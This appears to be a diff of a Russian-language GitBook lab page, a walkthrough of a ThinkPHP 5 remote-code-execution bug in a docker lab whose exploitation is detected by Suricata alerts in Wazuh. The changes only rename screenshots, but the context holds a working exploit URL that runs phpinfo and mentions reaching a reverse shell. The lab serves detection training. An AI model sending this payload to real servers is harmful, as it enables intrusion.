@@ -16,7 +16,7 @@ docker compose up -d
 
 После запуска по адресу http://ваш-ip:8080 будет доступна стандартна страница ThinkPHP
 
-<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/thinkphp-5-rce(1).png" alt=""><figcaption></figcaption></figure>
 
 Посетите следующую страницу для реализации уязвимости и вывода страницы phpinfo
 
@@ -24,12 +24,12 @@ docker compose up -d
 http://ваш-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
 ```
 
-<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/thinkphp-5-rce(2).png" alt=""><figcaption></figcaption></figure>
 
 Также вы можете выполнять произвольные команды на целевой машине вплоть до получения обратной оболочки уязвимой машины:
 
-<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/thinkphp-5-rce(3).png" alt=""><figcaption></figcaption></figure>
 
 В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.
 
-<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/thinkphp-5-rce(4).png" alt=""><figcaption></figcaption></figure>
